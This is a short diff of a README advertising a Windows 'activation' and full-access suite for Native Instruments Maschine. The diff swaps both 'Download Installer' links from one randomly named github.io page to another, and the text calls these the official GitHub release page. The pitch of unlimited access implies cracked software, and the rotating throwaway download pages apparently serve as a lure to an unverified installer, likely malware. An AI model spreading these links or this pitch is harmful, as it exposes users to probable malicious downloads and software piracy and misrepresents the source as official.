@@ -2,7 +2,7 @@
 
 Discover the ultimate desktop package for Native Instruments Maschine. This 2026 suite includes everything needed for activation, preset management, and expansion library access, giving you the complete Maschine experience without limitations on your Windows PC.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ A: No, the official support and all tools are developed exclusively for Windows 
 
 Access the latest installer and all future updates from the official GitHub release page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
